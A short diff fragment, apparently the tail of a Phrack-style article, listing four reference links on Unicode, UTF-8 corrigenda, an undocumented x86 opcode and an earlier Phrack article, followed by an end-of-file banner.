+[1] http://www.cl.cam.ac.uk/~mgk25/unicode.html
+[2] http://www.unicode.org/versions/corrigendum1.html
+[3] http://www.x86.org/secrets/opcodes/salc.htm
+[4] http://www.phrack.org/show.php?p=57&a=15
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
